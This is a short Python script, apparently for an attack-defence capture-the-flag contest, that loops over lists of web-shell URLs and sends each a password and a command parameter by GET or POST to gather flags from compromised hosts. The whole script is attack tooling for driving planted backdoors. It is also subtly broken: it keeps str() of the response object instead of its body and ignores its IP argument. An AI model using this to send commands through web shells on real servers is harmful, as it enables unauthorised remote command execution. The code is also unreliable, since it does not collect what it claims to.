import requests
Get_List = [] # (URL_to_shell, {PASS_PARA: PASS, CMD_PARA: CMD})
Post_List = [] # (URL_to_shell, {PASS_PARA: PASS, CMD_PARA: CMD}, None | {query_param: param})

def GetFlag(_ip):
    flags = []
    for i in Get_List:
        flags.append(str(requests.get(i[0], params=i[1])))
    for i in Post_List:
        flags.append(str(requests.post(i[0], data=i[1], params=i[2])))
    return flags
